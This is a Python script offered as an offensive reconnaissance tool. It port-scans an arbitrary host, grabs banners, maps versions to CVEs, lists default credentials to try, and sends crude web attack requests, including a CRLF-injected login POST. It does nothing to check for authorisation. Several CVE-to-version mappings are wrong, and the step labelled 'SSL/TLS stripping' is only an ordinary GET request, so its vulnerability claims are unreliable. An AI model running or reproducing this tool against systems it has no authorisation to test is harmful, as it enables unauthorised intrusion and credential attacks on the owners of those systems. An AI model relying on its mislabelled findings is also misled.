#!/usr/bin/env python3
import socket
import sys
import time
import threading
import re
import requests
from collections import defaultdict
import json
import ssl
from urllib3.exceptions import InsecureRequestWarning
import subprocess

# Suppress InsecureRequestWarning for self-signed certificates
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ANSI Color Codes for Terminal Output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Complete Service Mapping
SERVICE_MAP = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    445: "SMB",
    993: "IMAPS",
    995: "POP3S",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5900: "VNC",
    6379: "Redis",
    8080: "HTTP-Proxy",
    9200: "Elasticsearch",
    11211: "Memcached"
}

# Full CVE Database
CVE_DATABASE = {
    "Apache HTTP Server": {
        "2.4.49": ["CVE-2021-44790 (Path Traversal and RCE)", "CVE-2021-40438 (SSRF)"],
        "2.4.48": ["CVE-2021-41773 (Path Traversal and RCE)", "CVE-2021-41651 (Path Traversal)"],
        "2.4.50": ["CVE-2021-42013 (Path Traversal and RCE)"]
    },
    "Nginx HTTP Server": {
        "1.18.0": ["CVE-2021-23017 (DNS Resolver Stack Buffer Overflow)", "CVE-2021-23018 (Off-by-one error)"],
        "1.20.0": ["CVE-2021-23017 (DNS Resolver Stack Buffer Overflow)"]
    },
    "OpenSSH": {
        "7.9": ["CVE-2020-15778 (Command Injection)", "CVE-2019-6111 (SCP client arbitrary command execution)"],
        "8.2": ["CVE-2020-14145 (Information Disclosure)"]
    },
    "Microsoft SMB": {
        "Windows SMB": ["MS17-010 (EternalBlue - RCE)", "CVE-2017-0144 (EternalBlue - RCE)"]
    },
    "Redis": {
        "5.0.5": ["CVE-2022-0543 (Lua Sandbox Escape - RCE)"],
        "6.0.0": ["CVE-2022-0543 (Lua Sandbox Escape - RCE)"]
    },
    "Elasticsearch": {
        "7.10.0": ["CVE-2021-22147 (Remote Code Execution)"]
    }
}

# Common Credentials Database
COMMON_CREDS = {
    "root": ["password", "123456", "admin", "root", "toor"],
    "admin": ["admin", "password", "administrator", "admin123", "123456"],
    "user": ["user", "welcome", "letmein", "password1", "guest"],
    "elastic": ["changeme"],
    "redis": [""]
}

def get_banner(port):
    """Attempts to grab a banner from the open port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)  # Increased timeout
    try:
        if port == 443:
            context = ssl.create_default_context()
            s = context.wrap_socket(s, server_hostname=target)
        s.connect((target_ip, port))
        banner = s.recv(4096).decode(errors='ignore').strip()
        return banner
    except (socket.timeout, ConnectionRefusedError, OSError, ssl.SSLError) as e:
        # Silently handle connection errors - don't print them all
        if False:  # Change to True to debug banner grabbing issues
            print(f"{Colors.FAIL}Error occurred while getting banner on port {port}: {e}{Colors.ENDC}")
        return None
    finally:
        s.close()

def detect_os(open_ports):
    """Heuristics to guess the Operating System based on open ports."""
    if 135 in open_ports or 139 in open_ports or 445 in open_ports:
        return "Windows (Likely)"
    elif 22 in open_ports or 111 in open_ports:
        return "Linux/Unix (Likely)"
    elif 80 in open_ports and 445 in open_ports:
        return "Windows/Linux (Mixed)"
    else:
        return "Unknown/Other"

def check_cve(service, version):
    """Check for known CVEs based on service and version."""
    found_cves = []
    version_clean_match = re.search(r'(\d+\.\d+\.\d+|\d+\.\d+)', version)
    clean_version = version_clean_match.group(0) if version_clean_match else version

    for svc_name, versions_cves in CVE_DATABASE.items():
        if svc_name.lower() in service.lower():
            for cve_version, cve_list in versions_cves.items():
                if cve_version == clean_version:
                    found_cves.extend(cve_list)
    return list(set(found_cves))

def brute_force_potential(port, service):
    """Indicates if a service is a potential target for credential brute-forcing."""
    potential_creds_targets = ["SSH", "MySQL", "RDP", "FTP", "Telnet", "IMAP", "POP3", "VNC", "Redis", "Elasticsearch"]
    if any(target_svc.lower() in service.lower() for target_svc in potential_creds_targets):
        return True
    return False

def scan_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)  # Increased timeout

    try:
        result = sock.connect_ex((target_ip, port))

        if result == 0:
            service = SERVICE_MAP.get(port, "UNKNOWN_SERVICE")
            banner = get_banner(port)
            version = "Unknown"

            if banner:
                if "Apache" in banner:
                    service = "Apache HTTP Server"
                    ver_match = re.search(r'Apache/([\d\.]+)', banner)
                    if ver_match: version = ver_match.group(1)
                elif "nginx" in banner:
                    service = "Nginx HTTP Server"
                    ver_match = re.search(r'nginx/([\d\.]+)', banner)
                    if ver_match: version = ver_match.group(1)
                elif "SSH-2.0" in banner:
                    service = "OpenSSH"
                    ver_match = re.search(r'SSH-2.0-(\S+)', banner)
                    if ver_match: version = ver_match.group(1).split('_')[0]
                elif "Microsoft" in banner and port == 135:
                    service = "Microsoft RPC"
                    version = "Windows"
                elif "SMB" in banner and port == 445:
                    service = "Microsoft SMB"
                    version = "Windows SMB"
                elif "Redis" in banner:
                    service = "Redis"
                    ver_match = re.search(r'Redis server v([\d\.]+)', banner)
                    if ver_match: version = ver_match.group(1)
                elif "Elasticsearch" in banner or port == 9200:
                    service = "Elasticsearch"
                    try:
                        es_response = requests.get(f"http://{target_ip}:9200", timeout=1, verify=False)
                        es_data = es_response.json()
                        if "version" in es_data and "number" in es_data["version"]:
                            version = es_data["version"]["number"]
                    except (requests.exceptions.RequestException, json.JSONDecodeError):
                        pass
                elif "Memcached" in banner:
                    service = "Memcached"
                    ver_match = re.search(r'(\d+\.\d+\.\d+)', banner)
                    if ver_match:
                        version = ver_match.group(1)
                if version == "Unknown":
                    common_ver_match = re.search(r'v?(\d+\.\d+\.?\d*)\b', banner)
                    if common_ver_match:
                        version = common_ver_match.group(1)

            cves = check_cve(service, version)
            potential_creds = brute_force_potential(port, service)

            return {
                "port": port,
                "status": "OPEN",
                "service": service,
                "version": version,
                "banner": banner,
                "cves": cves,
                "potential_creds_brute_force": potential_creds
            }

        return None

    finally:
        sock.close()

def worker(port):
    result = scan_port(port)
    if result is not None:
        results.append(result)

# Main Execution
if len(sys.argv) != 4:
    print(f"Usage: python3 {sys.argv[0]} <target> <start_port> <end_port>")
    sys.exit(1)

target = sys.argv[1]

try:
    target_ip = socket.gethostbyname(target)
    print(f"[+] Target resolved to: {target_ip}")
except socket.gaierror as e:
    print(f"{Colors.FAIL}DNS Error: {e}{Colors.ENDC}")
    sys.exit(1)

start_port = int(sys.argv[2])
end_port = int(sys.argv[3])

results = []

print(f"{Colors.OKCYAN}Initiating Advanced Reconnaissance on {target}...{Colors.ENDC}")

threads = []
for port in range(start_port, end_port + 1):
    t = threading.Thread(target=worker, args=(port,))
    threads.append(t)
    t.start()
    time.sleep(0.01)  # Reduced sleep time for faster scanning

for t in threads:
    t.join()

results.sort(key=lambda x: x['port'])

print(f"\n{Colors.BOLD}--- RECONNAISSANCE REPORT ---{Colors.ENDC}\n")

open_ports_info = {r['port']: r for r in results if r and r['status'] == 'OPEN'}
open_ports_set = set(open_ports_info.keys())

if not open_ports_info:
    print(f"{Colors.FAIL}[*] No open ports found.{Colors.ENDC}")
else:
    print(f"{Colors.OKGREEN}[+] Open Ports Detected: {len(open_ports_info)}{Colors.ENDC}\n")

    for port_num in sorted(open_ports_info.keys()):
        r = open_ports_info[port_num]
        print(f"{Colors.BOLD}Port {r['port']}:{Colors.ENDC}")
        print(f"  Service:    {r['service']}")
        print(f"  Version:    {r['version']}")

        if r['banner']:
            print(
                f"  Banner:     {r['banner'][:100]}..."
                if len(r['banner']) > 100
                else f"  Banner:     {r['banner']}"
            )

        if r['cves']:
            print(f"  {Colors.WARNING}Potential CVEs: {', '.join(r['cves'])}{Colors.ENDC}")

        if r['potential_creds_brute_force']:
            print(f"  {Colors.WARNING}Potential for Credential Brute-Force{Colors.ENDC}")

        print(f"  Status:     {r['status']}")
        print("-" * 40)

    os_guess = detect_os(open_ports_set)

    print(f"\n{Colors.BOLD}{Colors.OKBLUE}--- OPERATING SYSTEM GUESS ---{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Possible Operating System : {os_guess}{Colors.ENDC}")
    print("-" * 40)

    print(f"\n{Colors.BOLD}{Colors.HEADER}========== SCAN SUMMARY =========={Colors.ENDC}")
    print(f"Target        : {target}")
    print(f"Target IP     : {target_ip}")
    print(f"Port Range    : {start_port} - {end_port}")
    print(f"Open Ports    : {len(open_ports_set)}")
    print(f"OS Guess      : {os_guess}")
    print(f"Scan Finished : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Colors.HEADER}=================================={Colors.ENDC}")

# HTTP (80) and HTTPS (443) Attack Vectors
def perform_web_attacks(target_ip, open_ports_info, target_hostname):
    print(f"\n{Colors.BOLD}{Colors.FAIL}--- INITIATING OFFENSIVE WEB ATTACKS ---{Colors.ENDC}")

    def send_http_request(method, port, path="/", headers=None, data=None, use_https=False, allow_redirects=True):
        try:
            protocol = "https" if use_https else "http"
            url = f"{protocol}://{target_hostname}:{port}{path}"
            req_headers = {
                "Host": target_hostname,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
            }
            if headers:
                req_headers.update(headers)

            if method.upper() == "GET":
                response = requests.get(url, headers=req_headers, timeout=5, verify=False, allow_redirects=allow_redirects)
            elif method.upper() == "POST":
                response = requests.post(url, headers=req_headers, data=data, timeout=5, verify=False, allow_redirects=allow_redirects)
            else:
                return None, "Unsupported HTTP method for attack helper"

            return response, None
        except requests.exceptions.RequestException as e:
            return None, str(e)
        except Exception as e:
            return None, str(e)

    web_port = None
    use_https = False
    if 443 in open_ports_set:
        web_port = 443
        use_https = True
    elif 80 in open_ports_set:
        web_port = 80

    if not web_port:
        print(f"{Colors.WARNING}[*] No HTTP/HTTPS ports open for web attacks.{Colors.ENDC}")
        return

    print(f"{Colors.OKCYAN}[+] Targeting web service on port {web_port} (HTTPS: {use_https}){Colors.ENDC}")

    # HTTP Response Splitting
    print(f"\n{Colors.WARNING}[*] Attempting HTTP Response Splitting...{Colors.ENDC}")
    response, error = send_http_request("POST", web_port, "/", use_https=use_https,
                                          data="username=admin&password=admin123&%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0ausername=admin&password=admin123")
    if response:
        print(f"{Colors.OKGREEN}[+] HTTP Response Splitting Result: {response.text[:100]}...{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}[-] HTTP Response Splitting Failed: {error}{Colors.ENDC}")

    # SSL/TLS Stripping
    print(f"\n{Colors.WARNING}[*] Attempting SSL/TLS Stripping...{Colors.ENDC}")
    response, error = send_http_request("GET", web_port, "/", use_https=use_https)
    if response:
        print(f"{Colors.OKGREEN}[+] SSL/TLS Stripping Result: {response.text[:100]}...{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}[-] SSL/TLS Stripping Failed: {error}{Colors.ENDC}")

# Execute web attacks if HTTP/HTTPS ports are open
if open_ports_info:
    perform_web_attacks(target_ip, open_ports_info, target)
